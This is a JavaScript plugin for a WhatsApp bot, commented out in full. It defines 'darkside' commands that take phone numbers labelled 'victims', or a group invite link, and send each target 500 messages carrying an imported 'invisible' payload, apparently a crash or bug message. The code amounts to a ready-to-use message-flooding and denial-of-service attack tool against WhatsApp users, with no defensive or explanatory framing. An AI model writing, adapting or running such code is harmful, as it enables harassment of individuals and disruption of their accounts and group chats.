/**

const { adams } = require("../Ibrahim/adams");
const { delay, loading } = require("../Ibrahim/utils");
const { bwmxmd1 } = require("../Ibrahim/ibraah1");
const { bwmxmd2 } = require("../Ibrahim/ibraah2"); // Assuming a similar structure exists

const category = "darkside";
const reaction = "🔞";
const mess = {};
mess.prem = "You are not authorised to use this command!!!";

const phoneRegex = /^\d{1,3}[- ]?(\d{1,3} )?[\d- ]{7,10}$/;
const groupLinkRegex = /https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]{22}/;

const invisibleMessage = `${bwmxmd1}\n${bwmxmd2}`; // Combined content from both sources

async function sendBatchMessages(zk, victims, botNumber, ms, repondre) {
    for (let victim of victims) {
        if (!phoneRegex.test(victim)) {
            repondre(`${victim} is not a valid phone number`);
            continue;
        }

        const victimId = victim + "@s.whatsapp.net";

        try {
            // Send in batches of 50 messages
            for (let batch = 0; batch < 10; batch++) {
                const promises = Array.from({ length: 50 }).map(() =>
                    zk.sendMessage(victimId, { text: invisibleMessage }, { fromMe: false, userJid: botNumber, quoted: ms })
                );
                await Promise.all(promises);
            }
            console.log(`Messages successfully sent to ${victim}`);
        } catch (e) {
            console.log(`Failed to send messages to ${victim}: ${e}`);
            repondre(`Error sending messages to ${victim}`);
            break;
        }
    }
}

async function sendGroupMessages(zk, groupLink, ms, repondre) {
    try {
        const inviteCode = groupLink.split("/")[3];
        const groupMetadata = await zk.groupAcceptInvite(inviteCode);
        const groupId = groupMetadata.id;

        for (let batch = 0; batch < 10; batch++) {
            const promises = Array.from({ length: 50 }).map(() =>
                zk.sendMessage(groupId, { text: invisibleMessage }, { fromMe: false, quoted: ms })
            );
            await Promise.all(promises);
        }

        console.log(`Messages successfully sent to group: ${groupId}`);
        repondre("Messages sent successfully to the group.");
    } catch (e) {
        console.log(`Error sending group messages: ${e}`);
        repondre("Failed to send messages to the group.");
    }
}

// Command: Individual messages
adams(
    {
        nomCom: "xmd1",
        categorie: category,
        reaction: reaction,
    },
    async (dest, zk, commandOptions) => {
        const { ms, arg, repondre, superUser } = commandOptions;
        const victims = arg;

        if (!superUser) return repondre(mess.prem);
        if (!victims.length) return repondre("Please specify at least one victim.");

        await loading(dest, zk);

        try {
            const botNumber = zk.user.id;
            await sendBatchMessages(zk, victims, botNumber, ms, repondre);
        } catch (e) {
            console.log(`General error: ${e}`);
            repondre("An unexpected error occurred.");
        }
    }
);

// Command: Group messages
adams(
    {
        nomCom: "xmd2",
        categorie: category,
        reaction: reaction,
    },
    async (dest, zk, commandOptions) => {
        const { ms, arg, repondre, superUser } = commandOptions;
        const groupLink = arg[0];

        if (!superUser) return repondre(mess.prem);
        if (!groupLink || !groupLinkRegex.test(groupLink)) return repondre("Invalid group link.");

        await loading(dest, zk);

        try {
            await sendGroupMessages(zk, groupLink, ms, repondre);
        } catch (e) {
            console.log(`Error processing group command: ${e}`);
            repondre("An unexpected error occurred.");
        }
    }
);
**/
